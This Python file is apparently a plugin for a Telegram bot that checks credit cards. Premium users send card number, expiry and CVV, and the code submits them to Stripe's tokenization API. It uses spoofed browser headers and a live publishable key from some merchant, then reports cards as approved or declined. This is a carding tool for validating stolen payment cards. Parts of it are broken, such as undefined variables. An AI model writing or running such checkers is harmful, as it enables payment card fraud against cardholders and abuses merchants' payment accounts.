#https://secure.lglforms.com/form_engine/r/06e374b1-00ab-40ac-82f2-68c4d00ad3f8/finalize
import json
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from datos import idchat
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 




@Client.on_message(filters.command(["00"], ["/", "."]))
async def ar(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/ar card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/ar card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]

            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            
            
            
            mess = await message.reply_text(text)
            headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'es-ES,es;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',}

            data = f'card[name]=sddsfsfs+dsfdfdsfs&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_zip]=10010&guid=1ae2c337-d23e-4968-ba44-cf67f6c46ba8a11185&muid=d08c1efe-8e7c-4d41-8baa-ca43616df1c52fb682&sid=353cb48a-4874-461e-ab9f-bd193245b9371bdda1&payment_user_agent=stripe.js%2F80b922db8%3B+stripe-js-v3%2F80b922db8&time_on_page=44629&key=pk_live_51LPuSKAzgs4Ct4iM0y2GXuVDkgPOHWn5hZpvqvwx7sfEIREqteUs564l5oUL3Hv8NuleCWcKNROrLsiSDGr5CYZz005gbzkX9k'

            response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            text = gate.initial_progress(100)
            mess = await mess.edit_text(text)

                    
            if 'three_d_secure_2_source' in response.text:
                text = gate.finish_progress('Approved 3D ✅')
                await mess.edit_text(text)
            elif 'generic_decline' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress('Decline ❌', error['message'])
                await mess.edit_text(text)
            elif 'succeeded' in response.text:
                error = 'Succeeded ✅'
                text = gate.finish_progress('Approved ✅', error)
                await mess.edit_text(text)
            elif 'insufficient_funds' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress('Approved ✅', error['message'])
                await mess.edit_text(text)
            elif 'incorrect_cvc' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress(error["message"] + "✅", error['code'])
                await mess.edit_text(text)
            elif 'error' in response.text:
                error = response.json()["error"]
                text = gate.finish_progress(error["message"] + "❌", error['code'])
                await mess.edit_text(text)
            else:
                text = gate.finish_progress('Unknown ❌')
                await mess.edit_text(text)
